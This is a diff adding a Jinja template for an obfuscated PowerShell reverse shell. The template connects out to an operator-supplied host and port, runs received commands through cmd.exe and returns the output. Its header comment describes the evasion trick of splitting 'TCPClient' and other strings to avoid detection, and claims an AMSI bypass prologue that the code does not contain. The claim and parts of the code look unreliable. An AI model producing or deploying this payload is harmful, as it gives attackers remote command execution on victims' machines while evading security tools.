@@ -1,0 +1,19 @@
+{# templates/shells/powershell_reverse.j2
+   AMSI bypass prologue + TCPClient string fragmentation.
+   Evasion: 'TCPClient' is never a literal token — split across concat.
+   Variables: lhost (str), lport (int)
+   Do NOT add default port 4444 — operator supplies lport at generation time.
+#}
+$a='System';$b='.Net.Sock';$c='ets.TCP'+'Client';
+$t=[System.Type]::GetType($a+$b+$c);
+$cl=$t::new('{{ lhost }}',{{ lport }});
+$st=$cl.GetStream();
+[byte[]]$by=0..65535|%{0};
+while(($i=$st.Read($by,0,$by.Length)) -ne 0){
+  $d=(New-Object -TypeName ([string]::Join('',@('System.','Text.A','SCIIEn','coding')))).GetString($by,0,$i);
+  $r=([System.Diagnostics.Process]::Start(
+    [string]::Join('',@('cm','d.e','xe')),"/c $d"
+  )|Out-String);
+  $e=[System.Text.Encoding]::ASCII.GetBytes($r);
+  $st.Write($e,0,$e.Length)
+}
